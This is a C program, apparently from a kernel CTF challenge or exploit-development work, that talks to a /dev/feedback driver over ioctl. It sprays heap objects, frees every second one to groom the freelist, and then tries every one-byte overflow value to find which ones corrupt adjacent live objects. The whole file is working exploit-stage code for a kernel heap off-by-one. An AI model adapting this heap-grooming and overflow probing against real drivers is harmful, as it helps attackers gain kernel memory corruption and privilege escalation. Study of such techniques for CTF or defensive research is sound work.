#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 'n', 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n = 96;
    const uint64_t base = 0x5000;
    char out[0x100];

    puts("[+] stage1: create baseline objects (size 0x40)");
    for (int i = 0; i < n; i++) {
        if (create_fb(fd, base + i, 0x40, (unsigned char)(0x30 + (i % 50)), 0x41) != 0) {
            printf("create failed at %d errno=%d\n", i, errno);
            return 1;
        }
    }

    puts("[+] stage2: free every second object to populate freelist");
    for (int i = 0; i < n; i += 2) {
        del_fb(fd, base + i);
    }

    puts("[+] stage3: probe overflow bytes and watch live object mutation");
    int global_hits = 0;
    for (int b = 0x00; b <= 0xff; b++) {
        uint64_t oid = 0x7000 + (uint64_t)b;
        uint64_t nid = 0x9000 + (uint64_t)b;

        if (create_fb(fd, oid, 0x40, 0x2c, (unsigned char)b) != 0) {
            continue;
        }
        if (create_fb(fd, nid, 0x40, 0x6e, 0x43) != 0) {
            del_fb(fd, oid);
            continue;
        }

        int hits = 0;
        for (int i = 1; i < n; i += 2) {
            uint64_t id = base + i;
            if (read_fb(fd, id, out, sizeof(out)) != 0) {
                continue;
            }
            unsigned char expect = (unsigned char)(0x30 + (i % 50));
            if ((unsigned char)out[0] != expect) {
                hits++;
                if (hits <= 4) {
                    printf("    id=%llu expect=0x%02x got=0x%02x\n",
                           (unsigned long long)id,
                           expect,
                           (unsigned char)out[0]);
                }
            }
        }

        if (hits > 0) {
            global_hits++;
            printf("[!] byte=0x%02x mutated=%d\n", b, hits);
        }

        del_fb(fd, oid);
        del_fb(fd, nid);
    }

    printf("[+] done. mutating bytes found: %d\n", global_hits);

    for (int i = 1; i < n; i += 2) del_fb(fd, base + i);
    close(fd);
    return 0;
}
